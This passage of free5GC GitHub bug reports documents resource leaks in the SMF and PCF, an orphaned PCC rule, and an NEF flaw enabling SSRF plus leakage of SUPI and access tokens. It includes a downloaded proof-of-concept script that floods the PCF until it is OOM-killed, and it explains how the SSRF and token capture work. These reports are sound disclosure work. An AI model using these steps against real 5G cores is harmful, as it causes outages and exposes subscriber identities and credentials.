rspData, err := p.Consumer().
    N1N2MessageTransfer(ctx, smContext.Supi, n1n2Request, smContext.CommunicationClientApiPrefix)
if err != nil || rspData == nil {
    logger.ConsumerLog.Warnf("N1N2MessageTransfer for SendPDUSessionEstablishmentReject failed: %+v", err)
    return                                        // L301: no release
}
...
p.RemoveSMContextFromAllNF(smContext, true)       // L307: the only release
```

This path runs after UPF selection and IP allocation, so the UE IP and TEIDs are already assigned and leak along with the map entries.

**The accept path has the same shape.** `sendPDUSessionEstablishmentAccept` has four early returns and no release call anywhere:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L308-L369

Not releasing on success is correct, but a token or `N1N2MessageTransfer` failure means nothing reached the AMF while the context stays registered. Same defect, should be fixed in the same change.

## To Reproduce
free5gc v4.2.2, SMF v1.4.3. NRF/UDR/UDM/PCF/SMF on loopback, subscriber `imsi-208930000000001`, DNN `internet`, `oauth: true`. Only source change is an `AuthorizationCheck` bypass so `curl` can stand in for an AMF; `datapath.go`, `NewSMContext` and `RemoveSMContext` are untouched.

Two ordinary failures are needed. The UPF must be associated but unresponsive to session messages: a ~90-line UDP stub answers Association Setup and Heartbeat, ignores Session Establishment. (With no UPF at all, selection skips it and the create fails earlier on a path that releases correctly.) The AMF is simply not started, so `GetTokenCtx(NAMF_COMM, AMF)` fails.

A probe in the SMF runs `runtime.GC()` and reports the three map sizes, so anything still counted is reachable state.

**The leak, one request:**

    http=201                                        <- AMF is told the session exists
    Location: .../sm-contexts/cd02218a-0ba0-4e97-9ff4-b4e7a602cc6c
    probe now    : smContextPool 1, canonicalRef 1, seidSMContextMap 1
    probe at 15s : smContextPool 1, canonicalRef 1, seidSMContextMap 1

What happened in between:

    [INFO] Allocated UE IP address: 10.60.0.1
    [INFO] Sending PFCP Session Establishment Request
    [INFO] | 201 | POST /nsmf-pdusession/v1/sm-contexts     <- response already sent
       ... 9 s later, in the goroutine ...
    [WARN] Sending PFCP Session Establishment Request error: retry-out
    [WARN] Get NAMF_COMM context failed: server no response  <- L294, returns at L295

L307 is never reached. No `is deleted from pool`, no `Release IP`. The context, its IP and its TEIDs stay held while the AMF believes the session is up.

**Control, same setup:** remove the subscriber policy from the PCF and the create fails at `ApplySessionRules`, before the goroutine:

    [INFO] UE[imsi-...] PDUSessionID[1] Release IP[10.60.0.2]
    [INFO] smContext[urn:uuid:5ea46820-...] is deleted from pool

Same request, same code, released properly. Only the post-`201` async path leaks.

**Accumulation, 31 requests** — `pduSessionId` incrementing:

| requests | smContextPool | canonicalRef | seidSMContextMap | heap objects |
|---|---|---|---|---|
| 10 | 10 | 10 | 10 | 26,553 |
| 20 | 20 | 20 | 20 | 29,465 |
| 30 | 30 | 30 | 30 | 32,387 |
| 31, after forced GC | 31 | 31 | 31 | 32,730 |

Slope exactly 1 per request across all three maps, no ceiling, unchanged by `runtime.GC()`.

    'retry-out'                     31   every PFCP establishment failed
    'Get NAMF_COMM context failed'  31   every one reached L294
    'Allocated UE IP address'       31
    'Release IP'                     0   31 addresses out, none back

## Expected Behavior
When the reject path takes any early return (L276, L295, L301), and likewise when the accept path fails on a token or `N1N2MessageTransfer` error, the handler should still release the SMContext via `RemoveSMContextFromAllNF` before returning, so the context, its UE IP and its TEIDs are not leaked.

## Screenshots
N/A

## Environment
 - free5GC Version: v4.2.2 (SMF v1.4.3, `2232d299`)
 - OS: Ubuntu 24.04.5 LTS
 - Kernel version: 6.8.0-139-generic
 - go version: go1.27.0 linux/amd64
 - C compiler version (optional):

## Trace Files
### Configuration Files
N/A — default config with only `oauth: true` set. Reproduction conditions are described above.

### PCAP File
N/A — this is a code-logic issue, unrelated to the packet level.

### Log File

    [INFO] Allocated UE IP address: 10.60.0.1
    [INFO] Sending PFCP Session Establishment Request
    [INFO] | 201 | POST /nsmf-pdusession/v1/sm-contexts
    [WARN] Sending PFCP Session Establishment Request error: retry-out
    [WARN] Get NAMF_COMM context failed: server no response

## System Architecture (Optional)
Bare metal, single host. NRF/UDR/UDM/PCF/SMF on loopback, UPF replaced by an association-only UDP stub.

## Walkthrough (Optional)
The reject path runs after UPF selection and IP allocation, so the UE IP and TEIDs are already assigned and leak along with the map entries. The IP pool binds long before memory does: a `/24` DNN pool holds 254 addresses, so a few hundred leaked contexts exhaust it and new sessions are refused for the whole DNN while `free -m` still looks fine.

## Additional Context
Each create that reaches the reject path and takes L276, L295 or L301 permanently holds one entry in each of the three maps, the SMContext itself (thirteen maps, four ID generators, a BPManager, two UPTunnels, roughly 80 heap objects in the measured run), one UE IP address and four TEIDs.

The AMF does hold `smContextRef` from the `201`, so a release is not structurally impossible the way it is when the identifier is never sent. But the AMF was told the session succeeded and has no reason to release it, and in this scenario the AMF is itself unreachable. In practice these contexts persist until the SMF restarts or a create with the same SUPI and PDU session id reclaims them.

State also diverges three ways: the AMF and UE believe a session exists, the UPF has no session installed, and the SMF holds a context it failed to tear down.

items.title: [Bugs] SMContext leaked when GetTokenCtx fails during SM context create; empty 200 leaves the AMF with no smContextRef to release it
items.body:
## Bug Description
`HandlePDUSessionSMContextCreate` registers a new SMContext at line 78, then fetches an OAuth token from the NRF at line 134. If that fails, line 137 returns without releasing the context, without any response body, and without giving the AMF the `smContextRef` it would need to release it later.

Every request taking this path leaves a permanently unreleasable SMContext. Any NRF outage triggers it for every SM context create that arrives during the outage.

The sibling error path 25 lines above (line 109, DNN mismatch) does the right thing: it calls `makeEstRejectResAndReleaseSMContext`, which responds *and* releases. Only the token path omits it.

Three things are missing at line 137, and any one of them would have been enough to avoid the leak:
- no `RemoveSMContextFromAllNF(smContext, false)`
- no `c.JSON(...)`, so gin emits a bare `200` with an empty body
- no `smContextRef` in the response, so the AMF has no id to release with later

`smContext.Ref` is `uuid.New().URN()`, not derived from SUPI and PSI, so it cannot be reconstructed by an operator either.

Separately, returning `200` with an empty body for a failed create is itself a protocol defect: the AMF cannot distinguish it from success by status code.

**Acquire.** `NewSMContext` registers into `smContextPool` and `canonicalRef`:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L279-L284

```go
func NewSMContext(id string, pduSessID int32) *SMContext {
    smContext := new(SMContext)
    smContext.Ref = uuid.New().URN()
    smContextPool.Store(smContext.Ref, smContext)
    canonicalRef.Store(canonicalName(id, pduSessID), smContext.Ref)
```

**Release.** `RemoveSMContext` clears both maps and returns the UE IP and four TEIDs. Its only caller is `RemoveSMContextFromAllNF`, so a path that does not call that never releases:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L397-L426

```go
ReleaseUEIP(smContext.SelectedUPF, smContext.PDUAddress, smContext.UseStaticIP)
ReleaseTEID(smContext.LocalULTeid)
ReleaseTEID(smContext.LocalDLTeid)
...
smContextPool.Delete(ref)
canonicalRef.Delete(canonicalName(smContext.Supi, smContext.PDUSessionID))
```

**The error path that leaks.** Line 78 acquires:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L78

```go
smContext := smf_context.NewSMContext(createData.Supi, createData.PduSessionId)
```

Line 134 fetches the token, and line 137 returns:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L134-L138

```go
ctx, _, oauthErr := smf_context.GetSelf().GetTokenCtx(models.ServiceName_NUDM_SDM, models.NrfNfManagementNfType_UDM)
if oauthErr != nil {
    smContext.Log.Errorf("Get Token Context Error[%v]", oauthErr)
    return
}
```

**The sibling path 25 lines above does all three.** On a DNN mismatch:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L106-L110

```go
p.makeEstRejectResAndReleaseSMContext(c, smContext,
    nasMessage.Cause5GSMRequestRejectedUnspecified,
    &smf_errors.DnnNotSupported)
return
```

**Why line 134 fails in practice.** `GetTokenCtx` performs a live NRF fetch whenever OAuth is enabled:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/context.go#L306-L313

```go
func (c *SMFContext) GetTokenCtx(serviceName models.ServiceName, targetNF models.NrfNfManagementNfType) (
    context.Context, *models.ProblemDetails, error,
) {
    if !c.OAuth2Required {
        return context.TODO(), nil, nil
    }
    return oauth.GetTokenCtx(models.NrfNfManagementNfType_SMF, targetNF,
        c.NfInstanceID, c.NrfUri, string(serviceName))
}
```

## To Reproduce
free5gc v4.2.2, SMF v1.4.3. NRF/UDR/UDM/PCF/SMF on loopback, no UPF. Subscriber `imsi-208930000000001`, DNN `internet`, `oauth: true`. Only source change is an `AuthorizationCheck` bypass so `curl` can stand in for an AMF holding a valid token; `GetTokenCtx`, `NewSMContext`, `RemoveSMContext` and the create handler are untouched. A probe in the SMF runs `runtime.GC()` and reports the map sizes, so anything still counted is reachable state.

**The leak, one request** — NRF alive, three creates:

    psid=1 http=500    INSUFFICIENT_RESOURCES_SLICE_DNN (no UPF, fails further down)
    psid=2 http=500
    psid=3 http=500
    probe: smContextPool 0          <- that path calls the release

Kill the NRF. Nothing else changes, same request:

    http=200
    body: (empty)
    probe: smContextPool 1          <- held

    [INFO] In HandlePDUSessionSMContextCreate
    [ERRO] Get Token Context Error[server no response]    <- L136, returns at L137
    [INFO] | 200 | POST /nsmf-pdusession/v1/sm-contexts   <- empty body, no Location

Line 78 ran, line 134 failed, line 137 returned. The AMF gets a `200` it cannot act on and never learns the UUID. The NRF-alive run is the control: same endpoint, same payload, same code, and the only difference is whether line 134 succeeds.

**Accumulation, 200 requests** — `pduSessionId` 11 through 210:

| requests sent | smContextPool | canonicalRef | heap objects |
|---|---|---|---|
| 50 | 41 | 43 | 21,819 |
| 100 | 91 | 93 | 25,956 |
| 150 | 141 | 143 | 30,139 |
| 200 | 191 | 193 | 34,245 |
| final, after forced GC | 201 | 203 | 35,025 |

Slope exactly 1 per request, no ceiling, unchanged by `runtime.GC()`. `Get Token Context Error` appears 201 times, one per leaked context, confirming every one took line 137.

Any NRF unavailability at that moment takes the failing branch. No unusual configuration, no fault injection: killing the NRF process is the entire trigger.

## Expected Behavior
When the token fetch at line 134 fails, the handler should release the SMContext and return a proper error response with a body, as the sibling DNN-mismatch path does via `makeEstRejectResAndReleaseSMContext`. It should not return a bare `200` with an empty body, and the AMF should receive a response it can act on.

## Screenshots
N/A

## Environment
 - free5GC Version: v4.2.2 (SMF v1.4.3, `2232d299`)
 - OS: Ubuntu 24.04.5 LTS
 - Kernel version: 6.8.0-139-generic
 - go version: go1.27.0 linux/amd64
 - C compiler version (optional):

## Trace Files
### Configuration Files
N/A — default config with only `oauth: true` set. Reproduction conditions are described above.

### PCAP File
N/A — this is a code-logic issue, unrelated to the packet level.

### Log File

    [INFO] In HandlePDUSessionSMContextCreate
    [ERRO] Get Token Context Error[server no response]
    [INFO] | 200 | POST /nsmf-pdusession/v1/sm-contexts

## System Architecture (Optional)
**Bare metal, single host.** NRF/UDR/UDM/PCF/SMF on loopback, no UPF.

## Walkthrough (Optional)
Line 134 sits before IP and TEID assignment, so those were not leaked in this run. Any future error return added between assignment and the `201` would exhaust those pools too, and an IP pool is far smaller than memory.

## Additional Context
For the duration of an NRF outage, every SM context create that reaches line 134 leaves an unreleasable SMContext. The AMF receives `200` with an empty body, so it either treats the create as successful or retries, and each retry with a new `pduSessionId` adds another context.

Each one holds thirteen maps, four ID generators, a BPManager and two UPTunnels, roughly 80 heap objects in the measured run. There is no eviction, no timeout and no sweep over `smContextPool`, and `Ref` is a UUID that was never sent to the AMF, so the only ways they are removed are an SMF restart or a later create for the same SUPI and pduSessionId.

items.title: [Bugs] PCF: unprovisioned-SUPI AM-policy creates retain a UeContext each (missing UePool.Delete on the error path), causing unbounded memory growth
items.body:
## Bug Description

The free5GC PCF (v4.3.0) serves AM-policy association creates at `POST /npcf-am-policy-control/v1/policies`. `PostPoliciesProcedure()` (`NFs/pcf/internal/sbi/processor/ampolicy.go:197-240`) allocates a per-subscriber `UeContext` via `NewPCFUe(Supi)`, which **permanently stores** it in the process-global `pcfSelf.UePool` — no cap, no TTL, no eviction. The entry is cleaned up on exactly one failure path (no UDR discoverable); when a UDR **is** discoverable but the subsequent `GetAccessAndMobilityPolicyData(ue)` call fails (unprovisioned SUPI → UDR 404), both failure returns omit the `UePool.Delete` — the freshly created `UeContext` leaks forever.

The leak keys on the SUPI, so each request carrying a new distinct `imsi-<digits>` SUPI retains one more `UeContext` (struct + two maps + an ID generator + the SUPI string) for the lifetime of the process. Any host that can reach the PCF SBI port can drive unbounded PCF memory growth with a slow trickle of small JSON POSTs; there is no recovery short of a process restart.

With a heap-warmup-controlled differential on the full core, 10,000 distinct-SUPI creates grew the PCF RSS by **+13.0 MB** (monotonic, still climbing +5.2 MB in the second half, ~1.3 kB retained per request), while 10,000 creates reusing a single SUPI stayed **flat at +0.2 MB** — both hitting the identical `GetAccessAndMobilityPolicyData` 404, so the differential isolates per-distinct-SUPI `UePool` retention as the cause. The RSS stays elevated until the PCF is restarted (a fresh process returns to ~25 MB).

## To Reproduce

Restart the environment before every verification (shut down any other running core first):

1. Deploy the full free5GC v4.3.0 core network (UE registration, PDU session establishment and user-plane attach all work on this stack):

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/free5gc/4.3.0
   docker compose -p free5gc-v430 -f docker-compose.yaml down -v
   docker compose -p free5gc-v430 -f docker-compose.yaml up -d
   sleep 45                     # let the NFs register at the NRF
   ```

2. Provision 5 subscribers, then bring a UE through the full attach flow[Optional]:

   ```bash
   pip3 install git+https://github.com/hackeryounow/coresimrunner.git@v1.4.0
   coresimrunner --mode provision --count 5 --core-network free5gc \
           --core-address 127.0.0.1 --webui-port 5000 \
           --initial-imsi-index 1 --plmn 20893 \
           --opc 8e27b6af0e692e750f32667a3b14605d \
           --ki 8baf473f2f8fd09487cccbd7097c6862 \
           --username admin --password free5gc --no-ims

   docker exec -d ueransim bash -c 'cd /ueransim && ./nr-ue -c ./config/uecfg.yaml > /tmp/ue.log 2>&1'
   sleep 15
   docker exec ueransim sh -c 'grep -c "PDU Session establishment is successful" /tmp/ue.log'   # 2
   docker exec ueransim sh -c 'ping -I uesimtun0 -c 3 8.8.8.8'                                  # 0% loss
   ```

3. Run the PoC — resolve the PCF SBI address from the container into a variable, cap the PCF at 1 GiB, restart it for a clean baseline, then flood AM-policy creates with fresh unprovisioned SUPIs until the kernel kills the process:

   ```bash
   wget https://github.com/hackeryounow/5GCVulDB/raw/main/VUL-20261006-POC/poc.py
   pip3 install httpx
   docker update --memory 1g --memory-swap 1g pcf   # memory and swap must be set to the same value
   docker restart pcf && sleep 10                   # fresh process so the cap is measured from a clean baseline
   PCF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' pcf) && \
   python3 poc.py --target "$PCF_IP:8000" --pcf-container pcf --max-requests 0   # run in the same shell
   # -> PCF VmRSS climbs ~1.1 kB per request with no plateau; after ~43 min / ~932,000 requests:
   #    [poc] CONTAINER NO LONGER RUNNING — OOM expected
   #    [poc] container state: status=exited exit=137 oom=true finished=...
   #    [poc] VERDICT: OOM KILL REPRODUCED — the kernel terminated the leak-bloated PCF
   # revert the cap afterwards: docker update --memory 30g --memory-swap 30g pcf (or compose force-recreate)
   ```

## Expected Behavior

A failed AM-policy create must release the freshly created `UeContext`; PCF memory must return to its baseline after unprovisioned-SUPI creates instead of ratcheting upward until the process is restarted.

## Screenshots


PCF log signature (`docker logs pcf`) — each create reaches the UDR, gets 404, and returns down the leak path (23,995 occurrences across the run):

```
2026-10-19T06:37:55.305762677Z [INFO][PCF][AmPol] Handle AM Policy Create Request
2026-10-19T06:37:55.315043803Z [ERRO][PCF][Consumer] openapi error: 404, Not Found
2026-10-19T06:37:55.315096306Z [ERRO][PCF][AmPol] Get Access And Mobility Policy Data Error Problem[404, Not Found]
```


Memory-retention check: the attack was stopped the instant `VmRSS` crossed 512 MB (the PCF's last log lines are truncated in-flight POSTs from the kill moment) and the process was left completely idle; the Go runtime handed back only transient request garbage over the next ~4 minutes, then flatlined at ~346 MB for the remaining 16 minutes of zero traffic (final `docker stats`: 331.6 MB, CPU 0.00%) — 15.8× the 21.8 MB pre-attack baseline. Reclaimed garbage proves the garbage collector runs; the unreleased plateau proves the leaked `UeContext` set is still referenced by the process-global `UePool` — nothing short of a process restart returns the PCF to baseline:

```
attack stopped 21:20:05 at 512.1 MB rss (PCF idle from here on)
+0min 512.1  +2min 463.1  +4min 348.8  +6min  345.8
+8min 345.8  +10min 345.8 +12min 345.8 +14min 345.8
+16min 345.8 +18min 345.8 +20min 345.8  (baseline 21.8 MB → 15.8x retained)
```

## Environment

Please complete the following information:
- free5GC Version: v4.3.0
- Deployment: Docker-based 5G Core Network
- OS: Ubuntu 20.04.6 LTS (Desktop)
- Kernel version: 5.15.0-139-generic
- go version: 1.27.2 linux/amd64

## Trace Files

None.

## Additional Context

- **Vulnerability Type:** Missing Release of Memory after Effective Lifetime (CWE-401) / Allocation of Resources without Limits or Throttling (CWE-770)
- **Impact:** A host that can reach the PCF SBI port grows PCF memory without bound (~1.3 kB per distinct unprovisioned SUPI), and nothing is released when the attack stops — RSS held at 15.8× baseline through 20 idle minutes. 
- **CVSS v4:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` (**8.7 High**)

items.title: [BUG] PCF: app-session modify leaves an orphaned PCC rule in the SM policy decision when extractUmData fails
items.body:
## Bug Description

When an AF updates an application session, the PCF's `HandleModAppSessionContext` processes the media components and, for a media sub-component carrying a new flow, creates a PCC rule and installs it into the **stored** SM policy decision (`smPolicy.PolicyDecision.PccRules`). The new rule id is placed only in a local map that is written back to `appSession.RelatedPccRuleIds` at the very end of the handler. Two sponsored-connectivity failure exits sit between the install and that write-back; on either exit the handler returns without removing the rule and without registering it on the app session.

The paired release, `(*UeSmPolicyData).RemovePccRule`, is reached through `HandleDeleteAppSessionContext`, which walks `appSession.RelatedPccRuleIds`. Because the failed modify never wrote the id there, a later delete of the app session cannot free the rule; it is stranded in the SM policy decision for the life of the PDU session.

This is the modify-handler analogue of the same defect in `postAppSessCtxProcedure` (the app-session *create* path). The failure exit is taken whenever an AF asks for a `USAGE_REPORT` event subscription without a `usgThres`.

Source analysis on PCF v1.4.3, commit `df6c0da`. **Still present on upstream `main` (`eb57557`, 2026-08-20):** `HandleModAppSessionContext` (policyauthorization.go:544) still installs the rule into the decision (:659) and still writes `appSession.RelatedPccRuleIds` only at the end (:804), after the `extractUmData` exit (:785) — so the gap is unchanged on main.

### The rule is installed into the stored decision first.

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L606

`handleMediaSubComponent` (called at L606) creates the rule via `util.CreatePccRule` (L81) and installs it into the stored decision with `SetPccRuleRelatedData` (L104) and a direct write (L122). Back in the caller, the new rule id goes only into a **local** `relatedPccRuleIds` map.

```go
// inside handleMediaSubComponent
pccRule = util.CreatePccRule(smPolicy.PccRuleIdGenerator, precedence, nil, "")             // L81
...
util.SetPccRuleRelatedData(smPolicy.PolicyDecision, pccRule, tcData, &qosData, nil, nil)   // L104
...
smPolicy.PolicyDecision.PccRules[pccRule.PccRuleId] = pccRule                               // L122: decision.PccRules[id] = rule
```

### The failure exit returns before the id is registered on the app session.

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L776-L782

`extractUmData` returns an error for a `USAGE_REPORT` subscription with no `usgThres`, and the handler returns:

```go
if tempUmData, err := extractUmData(umID, eventSubs, ascUpdateData.EvSubsc.UsgThres); err != nil {
    problemDetail := util.GetProblemDetail(err.Error(), util.REQUESTED_SERVICE_NOT_AUTHORIZED)
    ...
    return nil, &problemDetail       // L776-782: rule already in decision; RelatedPccRuleIds not written
}
```

The write-back that would make the rule releasable happens only after both failure exits:

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L794-L795

```go
appSession.RelatedPccRuleIds = relatedPccRuleIds   // L794-795: reached only on success
```

### The release walks RelatedPccRuleIds, which the failed modify never updated.

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L473-L474

```go
for _, pccRuleID := range appSession.RelatedPccRuleIds {   // L473
    if err := smPolicy.RemovePccRule(pccRuleID, &deletedSmPolicyDec); err != nil {   // L474
```

The id of the rule left by the failed modify is not in `RelatedPccRuleIds`, so `HandleDeleteAppSessionContext` never frees it.

## To Reproduce

PCF v1.4.3, verified with a deterministic Go unit test on the real `(*Processor).HandleModAppSessionContext`, **no fault injection** (both failure branches reached with plain realistic AF PATCH bodies). Metric = `len(smPolicy.PolicyDecision.PccRules)` before/after the failed modify and after a subsequent `HandleDeleteAppSessionContext`.

Setup: one `AppSessionData`; a `SmPolicyData` with an empty `PolicyDecision.PccRules`, `SuppFeat "0800"` (bit 12 set, bit 5 clear), and empty `RelatedPccRuleIds`. Each PATCH adds one media sub-component (fDescs `["permit out ip from ... to any"]`), `aspId`/`sponId` set, a `USAGE_REPORT` event, and **no** `usgThres`.

**The leak**

| step | PccRules in SM policy decision |
|---|---|
| before failed modify | 0 |
| after failed modify (HTTP 403) | **1** |
| after `HandleDeleteAppSessionContext` | **1** (rule survives delete) |
| control: a properly owned rule, after delete | 0 |

**Accumulation** (same UE / app session / SM policy, distinct flow per request):

| failed modifies | PccRules in decision |
|---|---|
| 1 | 1 |
| 5 | 5 |

Same flow reused → bounded at 1 (dedup by flow description). A `QosData` + `TrafficControlData` leaks alongside each rule.

## Expected Behavior

On the error exits (L776, and the sibling sponsored-connectivity exit at L785), the handler should roll back the rules it added to `smPolicy.PolicyDecision` in this call before returning, so a rejected modify leaves the decision as it found it.

## Screenshots

N/A

## Environment

- free5GC Version: PCF v1.4.3 (`df6c0da`); reproduced through the PCF processor unit-test harness
- OS: Ubuntu 24.04.5 LTS
- Kernel version: 6.8.0-139-generic
- go version: go1.25.5 linux/amd64

## Trace Files / Configuration Files

N/A. Test-only; no change to product code.

## PCAP File

N/A. This is a code-logic issue, unrelated to the packet level.

## Log File

```
[11 path35] HTTP=403 body={"status":403,"detail":"usageThreshold is nil in USAGE REPORT Subscription","cause":"REQUESTED_SERVICE_NOT_AUTHORIZED"}
[11 path35] PccRules on UeSmPolicyData: before=0 after-failed-modify=1
[11 path35] appSession.RelatedPccRuleIds=map[] (new rule NOT registered)
[11 path35] after HandleDeleteAppSessionContext: PccRules=1 (LEAK: rule survives delete)
```

## Additional Context

The orphaned rule sits in `smPolicy.PolicyDecision`, which the PCF sends to the SMF on the next successful app-session update for the same PDU session, so a rule an AF was rejected for (403) can still be provisioned toward the SMF/UPF on a later accepted request. The sibling exit at L785 (`handleSponsoredConnectivityInformation`, UMC not supported) has the identical defect. Rules are freed only when the SM policy (PDU session) is deleted.

## How did we find?

We found this bug by using our (work-in-progress) static analysis tool, manually verified it, and made a runnable PoC.

items.title: [Bugs] NEF sets the PCF's notification URI to an unvalidated AF callback URL, enabling SSRF and leaking the PCF's internal SBI URI (currently also containing SUPI) and access token
items.body:
[Originally posted as GHSA-fmxp-3mcg-fw9g]

## Description

When an AF creates a Traffic Influence subscription, the NEF sets the PCF Application Session
Context's notification URI to the **AF's own external callback URL** rather than to a NEF-hosted
URI. PCF-originated notifications for that session therefore bypass the NEF entirely, and the PCF's
termination request carries its own internal SBI resource URI to a party outside the operator
domain.

**Affected file:** `internal/sbi/processor/ti.go` (line 494 at NEF `f7db481`; unchanged on current
`main` `3387eb9`, where it is line 530). Present in every free5GC release from v3.4.4 to v4.3.0.

### Root Cause Analysis

```go
// internal/sbi/processor/ti.go:487-500 (excerpt)
asc := &models.Pcf_PolAuth_AppSessionContext{
    AscReqData: &models.Pcf_PolAuth_AppSessionContextReqData{
        ...
        NotifUri:  tiSub.NotificationDestination,   // line 494 — AF's external URL
        ...
    },
}
```

The correct pattern is used twice nearby — once further down **the same function**, for the
up-path-change subscription, and again in the sibling converter
`convertTrafficInfluSubToTrafficInfluData` (which begins at `:525`):

```go
// :505 — same function, convertTrafficInfluSubToAppSessionContext (:479-510)
NotificationUri: p.genNotificationUri(),
// :534 — sibling function, convertTrafficInfluSubToTrafficInfluData
UpPathChgNotifUri:     p.genNotificationUri(),
```

1. `genNotificationUri()` exists and is the established convention
2. It is simply not applied at `:494`
3. The PCF now holds the AF's URL as its notification target
4. On application session termination the PCF POSTs directly to the AF, with the NEF out of the path
5. The `TerminationInfo` body carries `ResUri` — the PCF's own internal SBI resource URI, of the
   form `https://{pcf-sbi-ip}:{port}/npcf-policyauthorization/v1/app-sessions/{appSessionId}`.
   The PCF allocates `appSessionId` as `<SUPI>-<n>` (`NFs/pcf/internal/context/ue.go:443-452`), so
   the URI also carries the subscriber's SUPI

**Problem:** an AF-supplied callback URL is propagated into an internal NF's notification
configuration instead of being substituted with a NEF-hosted URI and proxied.

### PoC

1. AF creates a Traffic Influence subscription for the IP address of a UE with an active PDU
   session, with `notificationDestination = https://af.example.net/cb`
2. `convertTrafficInfluSubToAppSessionContext` copies that value into `AscReqData.NotifUri` at
   `:494`; the NEF creates the PCF app session with it
3. The UE's PDU session is released, so the PCF terminates the application session
4. The PCF builds a `TerminationInfo` whose `ResUri` is its own internal app-session URI and POSTs
   it (over HTTP/2) to `https://af.example.net/cb/terminate`
5. The AF holds the PCF's internal IP, port and app-session ID, which contains the [SUPI](https://github.com/free5gc/pcf/blob/22674cb4f8b428cd98b76568c8da42a2e23354b1/internal/context/ue.go#L443-L452). The NEF logged nothing, because it was not involved.

### Impact

Any AF that creates a Traffic Influence subscription for a UE address receives, on session
termination, the PCF's internal IP address, SBI port and internal app-session identifier — which
embeds the subscriber's SUPI, contrary to TS 33.501 §5.9.2.3 ("SUPI shall not be sent outside the
3GPP operator domain by NEF"). The exposure is unconditional
rather than opt-in: `validateTrafficInfluenceData` (`:420-429`) rejects a subscription whose
`notificationDestination` is empty or not an absolute URI, so every accepted UE-address subscription
necessarily plants an AF-controlled URL in the PCF. (Group and any-UE subscriptions go to the UDR
with the NEF's own callback URI and are not affected.)

The AF is outside the operator trust boundary; concealing internal 5GC topology from it is the
NEF's architectural purpose. **The disclosed address identifies a reachable internal SBI endpoint**,
and the `ResUri` is not merely topology — it is the resource path of the subscriber's app session
on that endpoint (the PCF deletes that session right after the notification), handed to a party
outside the operator domain.

Because the NEF validates `notificationDestination` only for syntactic well-formedness (`:425-429`
— a parseable URI with a non-empty scheme and host, with no allowlist and no rejection of loopback,
private or link-local addresses), the AF chooses the destination freely. Two consequences follow
beyond the disclosure above.

First, the PCF performs the request from inside the operator network, so an AF outside that
boundary can direct an internal NF to POST to an internal address it could not otherwise reach — a
blind server-side request forgery primitive, the response not being relayed back to the AF (an
HTTP/2 POST with a fixed `TerminationInfo` body to `<notificationDestination>/terminate`).

Second, and more seriously, the PCF authenticates that request. `SendAppSessionTermination`
obtains an NRF-issued access token (`policyauthorization.go:1117`) and the generated client sets it
as `Authorization: Bearer …` on the outbound POST (`free5gc/openapi`, `client.go:401-408`). The
host the AF nominates therefore receives a valid access token scoped `npcf-policyauthorization`.
Combined with the token-validation defects in openapi's `VerifyOAuth`, reported separately — `aud`
unverified and `exp` never enforced — that token is replayable, without expiry, against any NF serving that scope.

Note that the token leak occurs *only* when OAuth2 is enabled: with `OAuth2Required` false the PCF
sends no token at all (`NFs/pcf/internal/context/context.go:449`). OAuth2 is enabled in the stock
configuration (`config/nrfcfg.yaml`: `oauth: true`), so the leak is the default behaviour; hardening
the deployment is what introduces the credential disclosure.



### Suggested fix

Substitute a NEF-hosted URI at `:494` so the PCF notifies the NEF rather than the AF directly.

`genNotificationUri()` cannot be reused verbatim, however: it returns
`ServiceUri(ServiceNefCallback) + "/notification/smf"` (`:476`), and the NEF's only callback route
is `POST /notification/smf`, handled by `SmfNotification` — the sole handler in
`internal/sbi/processor/callback.go`. The PCF appends `/terminate` to the notification URI, so
pointing it there would send the termination to `/notification/smf/terminate`, for which no route
exists.

The fix is therefore in two parts:

1. Add a distinct PCF notification endpoint — a `genPcfNotificationUri()` returning e.g.
   `/notification/pcf`, with a matching route for `POST /notification/pcf/terminate` and a handler,
   and set `NotifUri` at `:494` to it (the converter is used by both POST and PUT)
2. In that handler, map the internal app-session ID back to the AF's subscription and handle the
   termination in the NEF; the Traffic Influence API defines no termination notification towards
   the AF (TS 29.522 Table 5.4.2.1-1), so anything sent to the AF's `NotificationDestination` must
   carry NEF-hosted resource URIs only

Independently of the above, `validateTrafficInfluenceData` should sanitize
`notificationDestination` rather than only parse it.

## Source links

- [`convertTrafficInfluSubToAppSessionContext` — `NotifUri` at L494](https://github.com/free5gc/nef/blob/f7db48165dfe159be50bca330d5830cc7795f141/internal/sbi/processor/ti.go#L487-L500) — `internal/sbi/processor/ti.go` lines 487–500
- [**For comparison** — correct use of `genNotificationUri()`](https://github.com/free5gc/nef/blob/f7db48165dfe159be50bca330d5830cc7795f141/internal/sbi/processor/ti.go#L505) — `internal/sbi/processor/ti.go` line 505
- [**For comparison** — correct use again](https://github.com/free5gc/nef/blob/f7db48165dfe159be50bca330d5830cc7795f141/internal/sbi/processor/ti.go#L534) — `internal/sbi/processor/ti.go` line 534

- [`validateTrafficInfluenceData` — syntax-only check on the AF URL](https://github.com/free5gc/nef/blob/f7db48165dfe159be50bca330d5830cc7795f141/internal/sbi/processor/ti.go#L417-L429) — `internal/sbi/processor/ti.go` lines 417–429
